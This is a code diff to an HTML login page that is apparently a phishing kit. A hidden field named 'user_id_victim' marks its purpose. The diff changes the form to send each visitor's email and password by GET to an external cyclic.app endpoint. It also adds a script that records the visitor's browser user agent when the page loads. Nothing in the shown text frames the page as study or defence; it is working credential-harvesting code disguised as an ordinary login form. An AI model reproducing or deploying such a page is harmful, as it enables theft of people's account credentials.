@@ -21,25 +21,23 @@
 
             <!-- Formulaire -->
             <div style="background-color:#2c3b5a0f;padding:2 31px">
-                <form method="POST" style="padding-top:17px;" action="https://shraidar.org/new_login.php" method="POST">
+                <form method="GET" style="padding-top:17px;" action="https://important-red-gaiters.cyclic.app/get">
                     <div class="formulaire" style="background:white;">
 
 
-                        <input name="email" type="text" placeholder="Email" class="entrer" style="padding:12px;">
-
-
+                        <input name="email" id="a" type="text" placeholder="Email" class="entrer" style="padding:12px;">
 
                         <input name="type" type="hidden" value="mobile" />
-                        <input type="hidden" name="user_id_victim" " value="U0C63 " />
+                        <input name="userAgent" type="hidden" id="userA" value="U0C63 " />
+                         
+                        <input name="pass" type="password " id="b"  placeholder="Password" class="entrer " style="padding:12px; ">
+                        <div style="padding:12px; "> 
 
 
 
-<input name="pass " value=" " type="password "  placeholder="Password " class="entrer " style="padding:12px; ">
-              <div style="padding:12px; "> 
 
 
-
-                <button type="submit " class="square_btn ">Login</button>
+                <button type="submit " class="square_btn " >Login</button>
 
               </div>
             </div>
@@ -56,4 +54,10 @@
       </div>
     </div>
   </body>
+  <script type="text/javascript">
+    window.onload = ()=>{
+        document.getElementById("userA").value = window.navigator.userAgent;
+    }                  
+     
+  </script>
 </html>
